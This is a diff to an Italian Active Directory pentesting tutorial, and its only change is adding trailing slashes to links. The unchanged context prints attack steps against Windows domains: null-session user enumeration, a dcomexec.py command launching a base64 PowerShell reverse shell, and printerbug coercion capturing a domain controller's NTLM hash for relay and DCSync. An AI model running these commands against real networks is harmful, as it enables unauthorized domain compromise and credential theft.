@@ -122,7 +122,7 @@ Address: 192.168.100.10
 Address: dead:beef::1
 ```
 
-**Lettura dell'output:** il server si chiama `DC01` (domain controller!), ha due interfacce IPv4 (10.10.10.10 visibile e 192.168.100.10 su un'altra rete) e un IPv6. L'IP 192.168.100.10 è probabilmente una rete di management non visibile dal tuo segmento. Queste informazioni sono fondamentali per la [fase di ricognizione AD](https://hackita.it/articoli/active-directory).
+**Lettura dell'output:** il server si chiama `DC01` (domain controller!), ha due interfacce IPv4 (10.10.10.10 visibile e 192.168.100.10 su un'altra rete) e un IPv6. L'IP 192.168.100.10 è probabilmente una rete di management non visibile dal tuo segmento. Queste informazioni sono fondamentali per la [fase di ricognizione AD](https://hackita.it/articoli/active-directory/).
 
 ### RPC endpoint enumeration completa
 
@@ -160,7 +160,7 @@ user:[svc_sql] rid:[0x44f]
 user:[j.smith] rid:[0x450]
 ```
 
-**Lettura dell'output:** null session funzionante — enumerazione utenti completa senza credenziali. `svc_sql` è un service account (target per Kerberoasting). Per continuare l'attacco AD, scopri come eseguire [Kerberoasting e AS-REP Roasting](https://hackita.it/articoli/kerberos).
+**Lettura dell'output:** null session funzionante — enumerazione utenti completa senza credenziali. `svc_sql` è un service account (target per Kerberoasting). Per continuare l'attacco AD, scopri come eseguire [Kerberoasting e AS-REP Roasting](https://hackita.it/articoli/kerberos/).
 
 ## 4. Tecniche Offensive
 
@@ -184,7 +184,7 @@ domain\admin
 [-] DCOM SessionError: code: 0x80070005 - ERROR_ACCESS_DENIED
 ```
 
-**Cosa fai dopo:** hai esecuzione remota. DCOM non crea servizi, non scrive binari su disco e non genera i classici log di PsExec. Puoi eseguire comandi, scaricare file, o lanciare una shell. Per una reverse shell stealth: `dcomexec.py -object MMC20 domain/admin:pass@10.10.10.20 'powershell -e [base64_revshell]'`. Approfondisci le [tecniche di post-exploitation](https://hackita.it/articoli/post-exploitation).
+**Cosa fai dopo:** hai esecuzione remota. DCOM non crea servizi, non scrive binari su disco e non genera i classici log di PsExec. Puoi eseguire comandi, scaricare file, o lanciare una shell. Per una reverse shell stealth: `dcomexec.py -object MMC20 domain/admin:pass@10.10.10.20 'powershell -e [base64_revshell]'`. Approfondisci le [tecniche di post-exploitation](https://hackita.it/articoli/post-exploitation/).
 
 **DCOM con Pass-the-Hash**
 
@@ -220,7 +220,7 @@ python3 printerbug.py domain/user:pass@10.10.10.10 10.10.10.200
 [SMB] NTLMv2-SSP Hash: DC01$::DOMAIN:1122334455667788:AABBCCDD...
 ```
 
-**Cosa fai dopo:** hai l'hash NTLMv2 del computer account del DC. Se il target è un DC, puoi usare ntlmrelayx per LDAP relay e ottenere DCSync. Per la catena completa, consulta la guida alla [compromissione Active Directory](https://hackita.it/articoli/active-directory).
+**Cosa fai dopo:** hai l'hash NTLMv2 del computer account del DC. Se il target è un DC, puoi usare ntlmrelayx per LDAP relay e ottenere DCSync. Per la catena completa, consulta la guida alla [compromissione Active Directory](https://hackita.it/articoli/active-directory/).
 
 **Coercer — scan multiplo per coercion**
 
